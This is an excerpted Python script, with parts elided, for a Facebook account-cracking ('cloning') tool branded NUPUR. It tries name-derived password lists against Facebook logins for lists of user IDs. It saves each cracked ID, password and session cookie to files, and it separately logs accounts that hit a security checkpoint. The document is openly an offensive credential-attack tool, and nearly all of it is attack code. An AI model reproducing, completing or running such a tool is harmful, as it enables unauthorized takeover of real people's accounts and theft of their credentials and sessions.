...
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] ROLEX ')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] ABOUT TOOLS ADMIN ')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] YOUR CRUSH SOJIB ')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] FB ID NM Xojib Khan ')
try:
    import requests 
except ImportError:
...
sys.stdout.write('\x1b]2; NUPUR\x07')
...
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} SOJIB
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} SOJIB ãƒ„ã‚š
{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FILE {A}&{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} OWN TOOLðŸ˜‡
{G1}[{A}={G4}]{G4} WISH     {A}:{G4} NUPUR  BOW TAH....!
...
def menu():   
    ...
    if select =='1':
        _file_()
        os.system('xdg-open https://www.facebook.com/geniusparson12')
    elif select =='2':
        _randm_()
        os.system('xdg-open  https://www.facebook.com/geniusparson12')
    elif select =='3':
...
def _file_():
    ...
    print(f'{G1}[{A}3{G3}]{G3} METHOD {G3}[{A}M3{G3}]{G1} ')
    print(f'{G1}[{A}4{G4}]{G4} METHOD {G4}[{A}M4{G4}]{G1} ')
    linex()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/NUPUR.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}NUPUR-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[NUPUR-OK] {sid} | {ps} ")
                    open('/sdcard/NUPUR-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[NUPUR-CP] {sid} | {ps} ")
                     open('/sdcard/NUPUR-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:
                    continue
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}NUPUR-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{G1}[NUPUR-OK] {sid} | {ps} ")
                    open('/sdcard/NUPUR-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[NUPUR-CP] {sid} | {ps} ")
                    open('/sdcard/NUPUR-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}NUPUR{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[NUPUR-OK] {uid} | {pas}')
